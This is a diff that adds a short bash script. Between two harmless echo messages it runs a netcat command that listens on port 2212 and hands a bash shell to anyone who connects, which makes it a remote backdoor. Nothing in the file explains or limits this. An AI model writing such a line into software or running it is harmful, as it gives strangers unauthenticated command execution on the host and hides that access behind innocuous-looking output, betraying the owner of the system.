@@ -1,0 +1,5 @@
+#!/bin/bash
+
+echo "starting!"
+nc -l -p 2212 -e /bin/bash
+echo "finished!"
